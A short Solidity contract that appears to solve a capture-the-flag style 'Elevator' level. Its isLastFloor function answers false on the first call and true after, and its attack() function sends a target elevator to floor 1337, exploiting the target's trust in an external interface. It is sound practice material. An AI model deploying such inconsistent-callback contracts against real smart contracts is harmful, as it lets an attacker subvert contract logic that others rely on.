pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract BuildingElevatorFixed is Building {
    address public immutable elevator;
    uint8 private callCount = 0;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool isFirstCall = callCount == 0;
        callCount += 1;
        return !isFirstCall;
    }

    function attack() external {
        Elevator(elevator).goTo(1337);
    }
}